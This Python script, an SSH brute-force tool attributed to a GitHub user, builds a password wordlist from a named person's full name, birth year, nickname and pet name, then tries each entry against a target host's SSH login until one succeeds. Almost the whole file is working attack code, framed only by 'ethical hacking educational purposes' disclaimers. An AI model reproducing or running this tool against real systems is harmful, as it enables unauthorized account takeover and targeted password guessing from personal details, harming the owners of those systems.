"""
SSH Brute Force Automation Tool with Custom and Strong Wordlist Generator
Author: p4cket-hunt3r (https://github.com/p4cket-hunt3r)
For Ethical Hacking Educational Purposes Only
"""

import os
import sys
import time
import random
import string
import shutil
import platform

# -------------------------------
# Step 0: Auto-fix build errors (Rust, pip tools, etc.)
# -------------------------------

def install_requirements():
    print("\n[+] Checking and Installing Required Packages...")

    # Check if Rust is needed (common for Termux and newer Python versions)
    if shutil.which("pkg"):
        print("[+] Detected Termux. Checking Rust...")
        os.system("pkg install rust -y")
    elif shutil.which("apt"):
        print("[+] Detected Linux (APT based). Checking Rust...")
        os.system("sudo apt install rustc -y")

    # Upgrade pip, setuptools, wheel
    print("[+] Upgrading pip, setuptools, and wheel...")
    os.system(f"{sys.executable} -m pip install --upgrade pip setuptools wheel")

    # Finally install paramiko
    print("[+] Installing paramiko module...")
    os.system(f"{sys.executable} -m pip install paramiko")

try:
    import paramiko
except ImportError:
    install_requirements()
    try:
        import paramiko
    except ImportError:
        print("[-] Failed to install paramiko. Please check Python and pip installation.")
        sys.exit()

# -------------------------------
# Step 1: Wordlist Generation
# -------------------------------

def generate_random_password(length=12):
    chars = string.ascii_letters + string.digits + string.punctuation
    return ''.join(random.choice(chars) for _ in range(length))

def generate_wordlist(output_file):
    print("\n[+] Wordlist Generation - Target Specific")

    name = input("Target Full Name: ").strip()
    birthyear = input("Birth Year: ").strip()
    nickname = input("Nickname: ").strip()
    petname = input("Pet Name: ").strip()

    include_symbols = input("Include symbols? (yes/no): ").strip().lower() == "yes"
    include_numbers = input("Include number patterns? (yes/no): ").strip().lower() == "yes"
    include_strong = input("Add strong random passwords (Google-style)? (yes/no): ").strip().lower() == "yes"

    password_list = []

    # Basic custom patterns
    password_list.append(name + "123")
    password_list.append(name + birthyear)
    password_list.append(nickname + "123")
    password_list.append(petname + "123")
    password_list.append(name + "@" + birthyear)
    password_list.append(name + "12345")
    password_list.append(petname + birthyear)

    # Common weak passwords
    common_passwords = ["password", "123456", "admin", "letmein", "welcome"]
    password_list.extend(common_passwords)

    # Number patterns
    if include_numbers:
        number_patterns = ["123456", "12345678", "987654", "112233"]
        for base in [name, nickname, petname]:
            for num in number_patterns:
                password_list.append(base + num)

    # Symbol patterns
    if include_symbols:
        symbol_patterns = ["!", "@", "#", "$", "%"]
        for base in [name, nickname, petname]:
            for sym in symbol_patterns:
                password_list.append(base + sym)
                password_list.append(base + sym + birthyear)
                password_list.append(sym + base + "123")

    # Strong random passwords
    if include_strong:
        for _ in range(10):
            password_list.append(generate_random_password(12))

    # Save to file
    with open(output_file, "w") as file:
        for pwd in password_list:
            file.write(pwd + "\n")

    print(f"[+] Wordlist saved as: {output_file}")
    print("[+] Total passwords generated:", len(password_list))

# -------------------------------
# Step 2: SSH Brute Force Logic
# -------------------------------

def ssh_bruteforce(target_ip, username, wordlist_file):
    print("\n[+] Starting SSH Brute Force Process...")

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        with open(wordlist_file, "r") as file:
            passwords = file.readlines()
    except FileNotFoundError:
        print(f"[-] Wordlist file '{wordlist_file}' not found!")
        return

    for password in passwords:
        password = password.strip()
        try:
            print(f"[*] Trying: {password}")
            client.connect(target_ip, username=username, password=password, timeout=3)
            print(f"\n[+] Access Granted! Password Found: {password}")
            return
        except paramiko.AuthenticationException:
            print(f"[-] Wrong Password: {password}")
        except Exception as e:
            print(f"[!] Connection Error: {e}")

        time.sleep(0.5)

    print("\n[-] Brute Force Completed. Password not found in wordlist.")

# -------------------------------
# Step 3: Main Program Start
# -------------------------------

if __name__ == "__main__":
    print("\n==== SSH Brute Force Automation Tool ====")

    wordlist_file = "target_wordlist.txt"
    generate_wordlist(wordlist_file)

    print("\n[+] Enter SSH Target Details")
    target_ip = input("Target IP Address: ").strip()
    target_username = input("SSH Username: ").strip()

    ssh_bruteforce(target_ip, target_username, wordlist_file)

    print("\n==== Process Completed ====")
    print("This tool is for educational use on authorized systems only.")
